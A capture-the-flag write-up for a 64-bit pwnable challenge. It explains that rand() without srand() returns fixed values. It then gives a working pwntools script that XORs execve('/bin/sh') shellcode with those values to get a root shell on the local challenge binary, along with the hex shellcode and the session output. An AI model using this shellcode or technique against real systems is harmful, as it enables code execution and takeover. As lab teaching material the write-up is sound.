# Pwnable Challenge 1 Write-up
**xor bit calculation + shellcode**
- `rand()` function is little bit tricky.
- If `srand()` doesn't exist, `rand()` values are static value.
```
root@9eb26f7bbdb1:/shared/aegis/reversing/challenge1# ./a.out
103
198
105
115
81
255
74
236
41
205
186
171
242
251
227
70
124
194
84
248
27
232
231
141
118
90
46
root@9eb26f7bbdb1:/shared/aegis/reversing/challenge1# ./a.out
103
198
105
115
81
255
74
236
41
205
186
171
242
251
227
70
124
194
84
248
27
232
231
141
118
90
46
```
- Same values are returned.
- So, with this, we can calculate what values are needed for making shellcode.
- I use this one `6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05`
```
root@9eb26f7bbdb1:/shared/aegis/pwnable/challenge2# python solve.py
[+] Starting local process './challenge2': pid 5058
[*] '/shared/aegis/pwnable/challenge2/challenge2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05
[*] Switching to interactive mode
This is Simple 64bit pwnable challenge !
Just generate 64bit shellcode !
$ ls
challenge2  challenge2.c  solve.py
$ id
uid=0(root) gid=0(root) groups=0(root)
$
```
- Solve.py
```
from pwn import *
import ctypes

LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

p = process(["./challenge2"])
context.binary = "./challenge2"
sc = asm(shellcraft.sh())

xor_sc = ''

print sc.encode("hex")

for i in xrange(len(sc)):
    xor_sc += chr(ord(sc[i]) ^ (LIBC.rand() & 0xff))
p.sendline(xor_sc)
p.interactive()
```
